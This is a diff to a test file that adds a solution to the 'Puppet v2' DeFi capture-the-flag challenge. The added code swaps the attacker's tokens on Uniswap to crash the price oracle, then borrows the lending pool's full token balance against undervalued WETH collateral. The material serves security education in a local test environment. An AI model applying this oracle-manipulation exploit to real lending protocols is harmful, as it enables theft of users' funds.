@@ -82,6 +82,63 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //balance before
+        const tokenBalanceBefore = await this.token.balanceOf(attacker.address);
+        const ethBalanceBefore = await ethers.provider.getBalance(attacker.address);
+        const wethRequiredBefore = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log('token balance before', ethers.utils.formatEther(tokenBalanceBefore));
+        console.log('eth  balance before', ethers.utils.formatEther(ethBalanceBefore));
+        console.log('weth required before', ethers.utils.formatEther(wethRequiredBefore));
+
+
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+
+        await this.uniswapRouter
+        .connect(attacker)
+        .swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE, 
+            1,
+            [this.token.address, this.weth.address], 
+            attacker.address, 
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            );
+
+        console.log('============= Swap =============');
+
+        //balance after
+        const tokenBalanceAfter = await this.token.balanceOf(attacker.address);
+        const ethBalanceAfter = await ethers.provider.getBalance(attacker.address);
+        const wethRequiredAfter = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+
+        console.log('token balance after', ethers.utils.formatEther(tokenBalanceAfter));
+        console.log('eth  balance after', ethers.utils.formatEther(ethBalanceAfter));
+        console.log('weth required before', ethers.utils.formatEther(wethRequiredAfter));
+
+        await this.weth.connect(attacker).deposit({value: ethers.utils.parseEther('29.5')})
+      
+        
+            await this.weth
+            .connect(attacker)
+            .approve(
+                this.lendingPool.address, 
+                ethers.utils.parseEther('29.5'))
+               
+
+        
+    await  this.lendingPool
+           .connect(attacker)
+           .borrow(POOL_INITIAL_TOKEN_BALANCE);
+           
+
+        console.log('============= Borrow =============');
+
+        const tokenBalance = await this.token.balanceOf(attacker.address);
+        console.log('token balance', ethers.utils.formatEther(tokenBalance));
+
+        const wethBalance = await this.weth.balanceOf(attacker.address);
+        console.log('token balance after', ethers.utils.formatEther(tokenBalanceAfter));
+        console.log('final weth balance', ethers.utils.formatEther(wethBalance));
+
     });
 
     after(async function () {
